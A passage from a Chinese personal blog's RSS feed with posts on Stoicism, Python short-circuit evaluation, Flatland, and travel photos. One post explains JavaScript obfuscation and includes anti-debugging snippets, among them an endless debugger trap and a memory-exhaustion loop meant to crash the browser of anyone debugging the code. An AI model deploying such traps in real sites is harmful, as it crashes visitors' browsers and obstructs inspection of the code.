&lt;p&gt;正如刚才所说，斯多葛学派认为我们的价值观就好比阳光照亮物体那样，是投射而并非实体。我们戴着玫瑰色的眼镜看世界，收获的视野会跟戴着阴郁的暗蓝色眼镜来得不同。斯多葛学派人士用来自我提醒的方法是用非常客观的语言来描述事件，避免任何强烈的价值判断或情绪化的修辞。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;理解美德&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;斯多葛主义的训练在某种程度上就是澄清我们自身的核心价值观。斯多葛派确实相信这些价值观应该是理性的——这是一种基于理性的哲学，而不是一种基于信仰、传统或启示的宗教。&lt;/p&gt;
&lt;p&gt;不过，斯多葛学派哲学之所以能在理性上迈出一大步，要归功于他们从苏格拉底那里继承来的一种简单工具。在它的帮助下，斯多葛学派得以阐明他们的价值观，并使其逻辑上更为严谨统一。&lt;/p&gt;
&lt;p&gt;我们可以将其描述为一种“双重标准”的策略。找一张纸，在中间画一条线，分成两列。在一栏的顶部写上“期望”，在另一栏的顶部写上“钦佩”。现在，在第一个标题下，写下一些你生活中最不开心的事情，或者你发现自己花时间去追求的事情。&lt;/p&gt;
&lt;p&gt;这些可以是你投入了精力想要避免、改变或实现的事情。例如，人们倾向于写“寻找伴侣”，“在工作中给人留下深刻印象”，或者“看新闻”等等。他们当下表现得好像这些事情很重要。&lt;/p&gt;
&lt;p&gt;现在想想别人身上你最钦佩的品质，他们是谁并不重要，可以是朋友或同事，也可以是你崇拜的历史人物或虚构人物。你觉得他们的哪些性格特征最值得称赞？阐明你自身价值观的一个简单方法，就是想想别人身上你最钦佩的品质。&lt;/p&gt;
&lt;p&gt;最后，如果你将一些或全部的“美德”移到第一列中，会发生什么？换句话说，如果你投入更多的时间和精力来培养你所钦佩人物的品质，生活将会有什么改变？你的今天、明天和后天会变得怎么样？如果这成为一个长期的习惯或者你的整个生活方式呢？例如，一个名叫克里托布鲁斯（Critobulus）的年轻人曾请求苏格拉底帮助他结交新朋友。苏格拉底让他列出他在理想朋友身上寻找的品质，并帮他反思和阐明这些品质。然后，他秉承一贯作风把整个讨论抛回到这个年轻人身上，问他自己有多少这样的品质。答案基本上是：一个都没有。&lt;/p&gt;
&lt;p&gt;他们得出的结论是，这个年轻人之前的问题是本末倒置的，**他应该先投入时间和精力把自己变成他想结识的对象那样的人。**他们的讨论恰好印证了苏格拉底的一个哲学母题：&lt;strong&gt;你应该在现实中成为你理想中想成为的样子。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;高处视野&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;记住，斯多葛主义是一种哲学，而不是一种宗教。斯多葛学派希望运用理性牢牢地把握生活的真谛。他们自然而然指出来，为了做到这一点我们必须从一个更大的角度来考虑事情。多数时间，生活中的我们狭隘地看待事件，其性质等同于断章取义，由于关键信息的遗漏而存在误导性。因此，斯多葛派试图拓宽他们看事件的角度。他们明白，我们在生气或难过时倾向于缩小注意力范围，放大最糟糕的部分。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Python中的短路评估</title>
      <link>https://wander1ng.com/post/python%E4%B8%AD%E7%9A%84%E7%9F%AD%E8%B7%AF%E8%AF%84%E4%BC%B0/</link>
      <pubDate>Tue, 09 Jul 2024 14:22:49 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/python%E4%B8%AD%E7%9A%84%E7%9F%AD%E8%B7%AF%E8%AF%84%E4%BC%B0/</guid>
      <description>&lt;p&gt;在 Python 中，使用按位与运算符 &lt;code&gt;&amp;amp;&lt;/code&gt; 来连接多个条件在 if 语句中不是常见做法。如果你实际上是想判断多个布尔表达式的逻辑与，即 &lt;code&gt;a&lt;/code&gt;、&lt;code&gt;b&lt;/code&gt;、&lt;code&gt;c&lt;/code&gt; 都为真时执行某个代码块，那么你应该使用逻辑与 &lt;code&gt;and&lt;/code&gt; 运算符。&lt;/p&gt;
&lt;h3 id=&#34;使用逻辑与-and-运算符&#34;&gt;使用逻辑与 &lt;code&gt;and&lt;/code&gt; 运算符&lt;/h3&gt;
&lt;p&gt;当使用 &lt;code&gt;and&lt;/code&gt; 时，Python 会从左到右依次计算每个条件。如果其中任何一个条件为 &lt;code&gt;False&lt;/code&gt;，则整个表达式为 &lt;code&gt;False&lt;/code&gt;，并且后续的条件将不会被计算，程序直接跳到 &lt;code&gt;else&lt;/code&gt; 代码块。这种行为被称为 “短路” (short-circuit) 评估。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;a = True
b = False
c = True

if a and b and c:
    print(&amp;#34;All conditions are True&amp;#34;)
else:
    print(&amp;#34;One or more conditions are False&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在这种情况下，由于 &lt;code&gt;b&lt;/code&gt; 是 &lt;code&gt;False&lt;/code&gt;，所以 &lt;code&gt;c&lt;/code&gt; 不会被计算，程序直接进入 &lt;code&gt;else&lt;/code&gt; 代码块，输出：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;One or more conditions are False
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;使用按位与--运算符&#34;&gt;使用按位与 &lt;code&gt;&amp;amp;&lt;/code&gt; 运算符&lt;/h3&gt;
&lt;p&gt;按位与运算符 &lt;code&gt;&amp;amp;&lt;/code&gt; 对左右两边的操作数逐位执行按位与运算，不进行布尔运算。用于条件判断时，它会对所有操作数进行计算，而不会 “短路”。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;a = True
b = False
c = True

if a &amp;amp; b &amp;amp; c:
    print(&amp;#34;All conditions are True&amp;#34;)
else:
    print(&amp;#34;One or more conditions are False&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在这种情况下，虽然 &lt;code&gt;b&lt;/code&gt; 是 &lt;code&gt;False&lt;/code&gt;，但 &lt;code&gt;a&lt;/code&gt;、&lt;code&gt;b&lt;/code&gt;、&lt;code&gt;c&lt;/code&gt; 都会被计算。因为 &lt;code&gt;b&lt;/code&gt; 为 &lt;code&gt;False&lt;/code&gt;，所以结果仍然是 &lt;code&gt;False&lt;/code&gt;， 程序会进入 &lt;code&gt;else&lt;/code&gt; 代码块，输出：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;One or more conditions are False
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;小结&#34;&gt;小结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;逻辑与 &lt;code&gt;and&lt;/code&gt;&lt;/strong&gt;: 如果任何一个条件为 &lt;code&gt;False&lt;/code&gt;，则不会计算后续条件，直接跳到 &lt;code&gt;else&lt;/code&gt;（短路评估）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;按位与 &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/strong&gt;: 对所有条件进行位运算，不会短路。如果要判断多个布尔条件应使用 &lt;code&gt;and&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总的来说，在逻辑判断中使用 &lt;code&gt;and&lt;/code&gt; 是更为合理和常见的做法，因为它能够利用短路评估来提高代码的效率。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if a and b and c:
    # 执行所有条件都为真的情况
    ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这会在找到第一个 &lt;code&gt;False&lt;/code&gt; 时立即停止后续的判断，从而提高代码效率。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>《平面国》读书札记</title>
      <link>https://wander1ng.com/post/%E5%B9%B3%E9%9D%A2%E5%9B%BD%E8%AF%BB%E4%B9%A6%E6%9C%AD%E8%AE%B0/</link>
      <pubDate>Tue, 09 Jul 2024 11:28:45 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%B9%B3%E9%9D%A2%E5%9B%BD%E8%AF%BB%E4%B9%A6%E6%9C%AD%E8%AE%B0/</guid>
      <description>&lt;p&gt;《&lt;strong&gt;平面国&lt;/strong&gt;》（英语：&lt;em&gt;Flatland: A Romance of Many Dimensions&lt;/em&gt;）是&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%8B%B1%E5%9C%8B&#34;&gt;英国&lt;/a&gt;教师&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E5%9F%83%E5%BE%B7%E6%B8%A9%C2%B7%E9%98%BF%E4%BC%AF%E7%89%B9%C2%B7%E9%98%BF%E4%BC%AF%E7%89%B9&#34;&gt;埃德温·阿伯特·阿伯特&lt;/a&gt;一本出版于1884年的&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%AB%B7%E5%88%BA&#34;&gt;讽刺&lt;/a&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E4%B8%AD%E7%AF%87%E5%B0%8F%E8%AA%AA&#34;&gt;中篇小说&lt;/a&gt;。艾勃特借由此书中虚构的&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E4%BA%8C%E7%B6%AD%E7%A9%BA%E9%96%93&#34;&gt;二维空间&lt;/a&gt;平面国国民“正方形”一角来表达对于&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E7%B6%AD%E5%A4%9A%E5%88%A9%E4%BA%9E%E6%99%82%E4%BB%A3&#34;&gt;维多利亚时代&lt;/a&gt;阶层制度的尖锐评论。然而，这本中篇小说更长远的贡献是对于&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E7%B6%AD%E5%BA%A6&#34;&gt;维度&lt;/a&gt;的审视。在本书众多版本中有一段名科幻作家&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E4%BB%A5%E6%92%92%C2%B7%E8%89%BE%E8%A5%BF%E8%8E%AB%E5%A4%AB&#34;&gt;艾萨克·阿西莫夫&lt;/a&gt;写的序言评道，《平面国》是“一个人所能找到对于维度概念的感受方法中最好的”（The best introduction one can find into the manner of perceiving dimensions）。本书因而仍旧受&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E6%95%B8%E5%AD%B8&#34;&gt;数学&lt;/a&gt;、&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E7%89%A9%E7%90%86%E5%AD%B8&#34;&gt;物理学&lt;/a&gt;和&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E7%A7%91%E5%AD%B8&#34;&gt;计算机科学&lt;/a&gt;的学生所喜爱。另外，已有几部电影改编自此书。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;平面国的士兵和最底层的体力劳动者是两条边等长的三角形——两条等长的边各长11英寸左右，第三条边（或称底边）则非常短，通常不超过半英寸。这类人的顶角是一个非常尖锐、叫人害怕的角。事实上，如果士兵和体力劳动者的底边特别短（不超过八分之一英寸）的话，他们看起来几乎和线段形的女性一样，他们的顶角也会极端尖锐。空间国的居民把这种形状称为等腰三角形，我们平面国的居民也这么称呼。下面，我会将士兵和底层体力劳动者统称为等腰三角形。
平面国的中产阶级是等边三角形，也就是三边长度相等的三角形。
平面国中的专业人士和绅士（我本人就属于这一阶级）是正方形或五边形。
在专业人士和绅士之上还有贵族阶级。贵族阶级内部也有高低之分。最低等级的贵族是六边形。从六边形开始，边的数目越多，身份就越高贵。高级的贵族会获得“多边形”的荣誉头衔，也就是说他们有许多条边。当多边形的边数多到一定程度，每条边就变得非常短，整个形状几乎已经像一个圆。这种形状的人属于圆形阶级或僧侣阶级。僧侣阶级是地位最高的阶级。
平面国的自然规律让所有男孩都比父亲多一条边，这样每一代人的阶级地位都比上一代人高一点（这是平面国的社会规则）。因此，正方形的儿子是五边形，五边形的儿子是六边形，以此类推。
但是，上述规则并不总适用于商人，更不适用于士兵和体力劳动者。士兵和体力劳动者几乎不配被称为“人”，因为他们连各边等长的条件都满足不了。上一段中提到的自然规律与底层阶级无关。等腰三角形（即两条边等长的三角形）的儿子仍然是等腰三角形。但是，下层阶级也不是完全没有提升社会地位的希望。即使是等腰三角形的子孙也有可能最终摆脱卑微的出身。假如一个等腰三角形能够屡建军功，或者能够勤奋娴熟地劳动，那么一段时间后，这些工匠和士兵中的聪明人通常会发现他们的第三条边（底边）稍微增长了一些，而两条侧边则稍微缩短了一些。经僧侣阶级安排，智力较高的底层阶级可以让他们的儿女缔结婚姻。这种婚姻孕育的子女会更接近三边等长的等边三角形。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;为了防止下层阶级暴动，自然创造了一种充满智慧的规律：当下层阶级的智力、知识，或者德行有所提高时，他们的锐角角度也会等比提高，这样他们就越来越接近相对无害的等边三角形。因此，在士兵阶级中，虽然角度越小的士兵越野蛮可怕（这类人的智力几乎和女性一样低下），但若想合理地利用锐角的强大穿刺力，这些人就必须提高智力。可一旦提高智力，他们的穿刺力就会降低。
这种补偿的法则是多么伟大啊！而且我还要说，这种补偿法则完美地证明了平面国的贵族宪法具有完美的合理性和神圣的起源！通过明智地利用自然法则，多边形阶级和圆形阶级几乎总能将暴乱扼杀在萌芽状态，因为他们懂得利用人类心中的那既无法压抑，也没有边际的希望之火。为了强化法律和秩序，有时也得用上一点艺术。在大部分情况下，平面国的政府医生可以通过一些小小的人工手术延长或缩短叛军领袖的边。经过这种改造以后，智力较高的叛军领袖就变成了各边严格等长的形状，他们会立刻被接纳为特权阶级。叛军中的大部分人达不到接受手术的标准，对于这部分人，政府会诱惑他们住进政府医院中接受终身荣誉监禁。因为对最终进入高贵阶级抱有幻想，这些人往往屈服于政府的诱惑。在叛军中也会出现那么一两个决不投降的人，这种最顽固、最愚蠢、最无药可救的等腰三角形会被政府处决。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;用触觉分辨他人只是“低层阶级中”的通用做法。只有气候温和地区的高层阶级才能通过视觉来区分他人。
假如平面国没有雾，那么任何区域中的任何阶级都不可能用眼睛区分他人。幸好，除了气候特别炎热的地区以外，平面国的大部分地区几乎终年有雾。在你们空间国中，雾简直是一种彻头彻尾的邪恶之物：它遮挡美丽的风景，令人情绪低落，还会损害人们的健康。但在我们平面国中，雾却是上天的恩赐，其重要性几乎不亚于空气。在平面国中，雾是艺术的助手，雾是科学的源泉。若是让我尽情地歌颂雾，我还能滔滔不绝地说上很久。然而为了不偏离主题，我还是向读者们解释一下雾在平面国中的具体作用吧。
在平面国里，假如没有雾的话，所有线条都会同样清晰可辨。在某些不幸的国家中，大气完全干燥透明，那里的居民的确会一眼看清所有的线条。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>安阳游记</title>
      <link>https://wander1ng.com/post/%E5%AE%89%E9%98%B3%E6%B8%B8%E8%AE%B0/</link>
      <pubDate>Sun, 07 Jul 2024 12:25:03 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%AE%89%E9%98%B3%E6%B8%B8%E8%AE%B0/</guid>
      <description>&lt;h4 id=&#34;629殷墟博物馆殷墟王陵遗址殷墟宗庙遗址&#34;&gt;6.29殷墟博物馆+殷墟王陵遗址+殷墟宗庙遗址&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/7c1f9bc47d9e61172c46e26a509c6b66.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/65edd321af72082109f365cc97a5af0d.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/08e2bdb2b4e59c82be1572251940a129.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/19f4541351dd96becdde85e17ea0271c.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;630中国文字博物馆万佛沟修宁寺塔&#34;&gt;6.30中国文字博物馆+万佛沟+修宁寺塔&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/7873e3760d9205f7584fe759d5101e26.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/35c90804865ef8ae60eda0905589de2b.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/2e0e3220b9d47ee21477abc7a46d50a2.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>常见JavaScript混淆与反混淆</title>
      <link>https://wander1ng.com/post/%E5%B8%B8%E8%A7%81javascript%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86/</link>
      <pubDate>Fri, 05 Jul 2024 15:35:25 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%B8%B8%E8%A7%81javascript%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86/</guid>
      <description>&lt;p&gt;JavaScript 混淆（Obfuscation）是指通过一系列技术手段，使 JS 代码变得难以理解和分析，增加代码的复杂性和混淆度，阻碍逆向工程和代码盗用。实际上就是一种保护 JS 代码的手段。JS最早被设计出来就是为了在客户端运行，直接以源码的形式传递给客户端，如果不做处理则完全公开透明，任何人都可以读、分析、复制、盗用，甚至篡改源码与数据，这是网站开发者不愿意看到的。&lt;/p&gt;
&lt;p&gt;压缩工具开发的初衷是减小 JS 文件体积，但 JS 代码经过压缩替换后，其可读性也大大降低，间接起到了保护代码的作用。但是后来主流浏览器的开发者工具都提供了格式化代码的功能，压缩技术所能提供的安全保护收效甚微。于是专门保护 JS 代码的技术：JS 加密和 JS 混淆。&lt;/p&gt;
&lt;h4 id=&#34;常见混淆手段&#34;&gt;常见混淆手段&lt;/h4&gt;
&lt;p&gt;变量名/函数名的替换，将有意义的变量名函数名替换为随机生成的名称&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/*
function calculateArea(radius) {
  return Math.PI * radius * radius;
}
console.log(calculateArea(5));
*/
function _0x2d8f05(_0x4b083b) {
  return Math.PI * _0x4b083b * _0x4b083b;
}
console.log(_0x2d8f05(5));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;字符串混淆，将代码中的字符串替换为编码或加密的形式，可以防止字符串被轻易读取。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// console.log(&amp;#34;Hello, world!&amp;#34;);
console.log(&amp;#34;\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21&amp;#34;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;控制流混淆，改变代码的执行顺序或结构。例如，可以使用条件语句和循环语句来替换简单的赋值操作。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/*
let a = 1;
let b = 2;
let c = a + b;
console.log(c);
*/
let a = 1;
let b = 2;
let c;
if (a === 1) {
  if (b === 2) {
    c = a + b;
  }
}
console.log(c);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;花指令，即在源码插入一些不会被执行的代码。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/*
let a = 1;
let b = 2;
let c = a + b;
console.log(c);
*/
let a = 1;
let b = 2;
if (false) {
  console.log(a - b);
}
let c = a + b;
console.log(c);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;代码转换，将代码转换为等价的，但更难理解的形式。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/*
let a = 1;
let b = 2;
let c = a + b;
console.log(c);
*/
let a = 1;
let b = 2;
let c = a - (-b);
console.log(c);
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;常见反调试手段&#34;&gt;常见反调试手段&lt;/h4&gt;
&lt;p&gt;实现防止他人调试、动态分析自己的代码，我们可以预先在代码中做处理，防止用户调试代码。&lt;/p&gt;
&lt;p&gt;无限 debugger。比如写个定时器死循环禁止调试。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var c = new RegExp(&amp;#34;1&amp;#34;);
c.toString = function () {
    alert(&amp;#34;检测到调试&amp;#34;)
    setInterval(function() {
        debugger
    }, 1000);
}
console.log(c);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;内存耗尽。更隐蔽的反调试手段，代码运行造成的内存占用会越来越大，很快会使浏览器崩溃。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var startTime = new Date();
debugger;
var endTime = new Date();
var isDev = endTime - startTime &amp;gt; 100;
var stack = [];

if (isDev) {
    while (true) {
        stack.push(this);
        console.log(stack.length, this);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;检测函数、对象属性修改。攻击者在调试的时，经常会把防护的函数删除，或者把检测数据对象进行篡改。可以检测函数内容，在原型上设置禁止修改。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;function eval() {
    [native code]
}

window.eval = function(str) {
    console.log(&amp;#34;[native code]&amp;#34;);
};

window.eval = function(str) {
};

window.eval.toString = function() {
    return `function eval() {[native code]}`
};

function hijacked(fun) {
    return &amp;#34;prototype&amp;#34; in fun || fun.toString().replace(/\n|\s/g, &amp;#34;&amp;#34;) != &amp;#34;function&amp;#34; + fun.name + &amp;#34;() {[nativecode]}&amp;#34;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;在线混淆工具&#34;&gt;在线混淆工具&lt;/h4&gt;
&lt;h4 id=&#34;反混淆&#34;&gt;反混淆&lt;/h4&gt;
&lt;p&gt;JS 反混淆（Deobfuscator ）是指对经过混淆处理的代码进行还原和解析，以恢复其可读性。Deobfuscator 可以通过对代码进行静态分析和动态分析等方式来实现。需要注意的是，Obfuscation 只能降低可读性，不能完全避免逆向攻击，而 Deobfuscator 也并不能完全还原混淆过的代码。&lt;/p&gt;
&lt;h4 id=&#34;在线反混淆工具&#34;&gt;在线反混淆工具&lt;/h4&gt;
&lt;p&gt;以及浏览器前端中的Source窗口，配合console.log（）函数非常好用。&lt;/p&gt;
&lt;p&gt;目前的需求是，一段经过混淆的恶意代码，能否直接在前端执行出解混淆后的结果。目前认知来看只有编码类混淆可以，而且存在执行到C2的风险。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>摄影作品小记(持续更新中)</title>
      <link>https://wander1ng.com/post/%E6%91%84%E5%BD%B1%E4%BD%9C%E5%93%81%E5%B0%8F%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/</link>
      <pubDate>Fri, 05 Jul 2024 11:28:56 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E6%91%84%E5%BD%B1%E4%BD%9C%E5%93%81%E5%B0%8F%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/</guid>
      <description>&lt;h4 id=&#34;二二四-六月-安阳&#34;&gt;二〇二四 六月 安阳&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/970ac632cae0d501d8ff38d8f98a3283.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/af29ec3952dcbbe3b148ae530d33c599.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/9b7177783941278a90cb9d5a5331a1ea.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/51b49a5bdbacbdfa2e6d39f65775706d.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/00fcecb1cc0aaf02fcb4aed508dd7677.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/6ecfbda1d05bd0551aded30b45f05043.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/ab273d1399ca043ef3cdec01f7956e93.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c5e345230f2c73135bf464e4fe9e56ac.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/94582abb103f8342bb8cf26c4e82e61d.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/68456e34bb7fc26172c23ab8ac4782c9.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/253e5e4633be5444b0b8218004ea6612.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/7297339d5bafce752c59592f7788e8ef.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/13799a2c663c5c94fa4ccc170d466480.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/d297c0fc505e935e8e5e4bb4a35b3923.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/b75030224611b9aa5395f71ea4c69c14.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二二四-六月-中国考古博物馆&#34;&gt;二〇二四 六月 中国考古博物馆&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/93c140ed35d768b3860bc70c11968575.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/eb4a0e947f180ac8208f8d115fb52cdc.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/713d5fdcf204a8ea36439b2482b37d0f.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/3c4502dd1a47b84d0f51a35e0fee6325.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/e7552ff18658b6d0d107f736d2be84c3.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/84520e9d2a1154c9d785535c18507bb4.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;H:%5C%E6%91%84%E5%BD%B1%5C45PE+%E8%80%83%E5%8D%9A%5CP1072591.JPG&#34; alt=&#34;P1072591&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二二四-六月-china-pe&#34;&gt;二〇二四 六月 China PE&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/b681f32a792d0ef0ecbb242d7ea2bb29.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c9dc11301d4199198766891ec01223ec.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/0d7e6c31b7da4a0394ce3d2c249857c1.JPG&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二二四-六月-海南&#34;&gt;二〇二四 六月 海南&lt;/h4&gt;
